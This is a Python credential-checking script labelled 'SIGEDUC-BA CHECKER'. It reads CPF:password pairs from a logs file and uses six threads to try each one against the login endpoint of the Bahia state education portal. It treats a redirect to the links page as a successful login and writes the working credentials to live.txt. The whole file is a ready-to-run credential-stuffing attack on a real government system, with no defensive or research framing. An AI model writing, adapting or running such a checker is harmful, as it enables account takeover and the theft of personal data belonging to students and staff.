import requests
from colorama import init, Fore, Style
from concurrent.futures import ThreadPoolExecutor, as_completed
import os
import time

init(autoreset=True)

# Configurações
MAX_THREADS = 6
TIMEOUT = 15
LOGINS_FILE = 'logs.txt'
LIVE_FILE = 'live.txt'
DIE_FILE = 'die.txt'

# Contadores
stats = {
    'total': 0,
    'live': 0,
    'die': 0,
    'error': 0,
    'start_time': time.time()
}

def update_panel():
    elapsed = time.time() - stats['start_time']
    print("\033[H\033[J")  # Limpa o terminal
    print(Fore.CYAN + "══════════════════════════════════")
    print(Fore.YELLOW + "      SIGEDUC-BA CHECKER")
    print(Fore.CYAN + "══════════════════════════════════")
    print(Fore.GREEN + f" ✅ LIVE: {stats['live']}")
    print(Fore.RED + f" ❌ DIE: {stats['die']}")
    print(Fore.YELLOW + f" ⚠ ERROR: {stats['error']}")
    print(Fore.CYAN + f" ⏳ TEMPO: {elapsed:.2f}s")
    print(Fore.CYAN + "══════════════════════════════════")

def login(cpf, senha):
    try:
        # Primeiro obtemos a sessão inicial
        with requests.Session() as session:
            session.headers.update({
                'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'Origin': 'https://sigeduc.educacao.ba.gov.br',
                'Referer': 'https://sigeduc.educacao.ba.gov.br/sigeduc/verTelaLogin.do'
            })

            # Requisição inicial para obter cookies
            session.get('https://sigeduc.educacao.ba.gov.br/sigeduc/verTelaLogin.do', timeout=TIMEOUT)

            # Fazendo o login
            data = {
                'urlRedirect': '',
                'acao': '',
                'user.login': cpf,
                'user.senha': senha
            }

            response = session.post(
                'https://sigeduc.educacao.ba.gov.br/sigeduc/logar.do?dispatch=logOn',
                data=data,
                allow_redirects=False,
                timeout=TIMEOUT
            )

            # Verificando se houve redirecionamento para a página de vinculos
            if response.status_code == 302 and 'vinculos.jsf' in response.headers.get('Location', ''):
                stats['live'] += 1
                save_result(LIVE_FILE, cpf, senha)
                return Fore.GREEN + f"✓ Live {cpf}:{senha}"
            else:
                stats['die'] += 1
                save_result(DIE_FILE, cpf, senha)
                return Fore.RED + f"× Die {cpf}:{senha}"

    except Exception as e:
        stats['error'] += 1
        save_result(DIE_FILE, cpf, senha, str(e))
        return Fore.RED + f"× Error {cpf}:{senha} - {str(e)[:30]}"

def save_result(filename, cpf, senha, error=None):
    try:
        with open(filename, 'a', encoding='utf-8') as f:
            if error:
                f.write(f'{cpf}:{senha} | {error}\n')
            else:
                f.write(f'{cpf}:{senha}\n')
    except:
        pass

def main():
    if not os.path.exists(LOGINS_FILE):
        print(Fore.RED + f"Arquivo {LOGINS_FILE} não encontrado!")
        return

    with open(LOGINS_FILE, 'r', encoding='utf-8') as f:
        accounts = [line.strip().split(':', 1) for line in f if ':' in line]
    
    stats['total'] = len(accounts)
    update_panel()

    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
        futures = []
        for acc in accounts:
            cpf, senha = acc[0], acc[1]
            futures.append(executor.submit(login, cpf, senha))

        for future in as_completed(futures):
            print(future.result())
            update_panel()

    print(Fore.CYAN + "\n✅ Verificação concluída!")

if __name__ == "__main__":
    main()